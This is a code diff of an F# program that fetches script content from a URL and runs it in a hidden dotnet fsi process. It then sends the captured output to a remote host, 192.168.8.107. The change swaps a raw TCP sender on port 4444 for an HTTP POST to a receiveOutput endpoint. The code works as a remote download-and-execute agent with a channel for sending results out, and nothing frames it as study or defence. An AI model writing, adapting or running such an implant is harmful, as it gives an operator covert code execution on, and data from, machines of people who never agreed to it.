@@ -1,6 +1,6 @@
 ﻿open System
 open System.Net
-open System.Net.Sockets
+open System.Net.Http
 open System.Diagnostics
 open System.Threading
 open System.IO
@@ -15,17 +15,18 @@ let downloadScriptContent (url: string) =
     | ex -> printfn "Error downloading script: %s" ex.Message
             None
 
-// Function to send output over TCP
-let sendOutput (ip: string) (port: int) (message: string) =
+// Function to send output to the web server
+let sendOutputToServer (url: string) (message: string) =
     try
-        use client = new TcpClient(ip, port)
-        let data = System.Text.Encoding.UTF8.GetBytes(message)
-        use stream = client.GetStream()
-        stream.Write(data, 0, data.Length)
-        stream.Close()
-        client.Close()
+        use client = new HttpClient()
+        let content = new StringContent(message, System.Text.Encoding.UTF8, "text/plain")
+        let response = client.PostAsync(url, content).Result
+        if response.IsSuccessStatusCode then
+            printfn "Output sent to server successfully"
+        else
+            printfn "Failed to send output to server: %s" (response.ReasonPhrase)
     with
-    | ex -> printfn "Error sending output: %s" ex.Message
+    | ex -> printfn "Error sending output to server: %s" ex.Message
 
 // Function to run the downloaded script content using dotnet fsi
 let runScriptContent (scriptContent: string) =
@@ -39,26 +40,25 @@ let runScriptContent (scriptContent: string) =
         startInfo.RedirectStandardInput <- true
         startInfo.CreateNoWindow <- true
 
-        // Start the process
-        use fsiProcess = Process.Start(startInfo)
-        use stdInput = fsiProcess.StandardInput
+        use proc = Process.Start(startInfo)
+        use stdInput = proc.StandardInput
 
         // Write the script content to the standard input of dotnet fsi
         stdInput.AutoFlush <- true
         stdInput.Write(scriptContent)
         stdInput.Close()
 
-        let output = fsiProcess.StandardOutput.ReadToEnd()
-        let errors = fsiProcess.StandardError.ReadToEnd()
-        fsiProcess.WaitForExit()
+        let output = proc.StandardOutput.ReadToEnd()
+        let errors = proc.StandardError.ReadToEnd()
+        proc.WaitForExit()
 
         printfn "Script Output:\n%s" output
         if errors.Length > 0 then
             printfn "Script Errors:\n%s" errors
 
-        // Send the output and errors over TCP
+        // Send the output and errors to the web server
         let fullOutput = "Script Output:\n" + output + "\nScript Errors:\n" + errors
-        sendOutput "192.168.8.107" 4444 fullOutput  // Replace with your IP address and port
+        sendOutputToServer "http://192.168.8.107:8000/receiveOutput" fullOutput  // Replace with your web server URL
     with
     | ex -> printfn "Error running script: %s" ex.Message
 
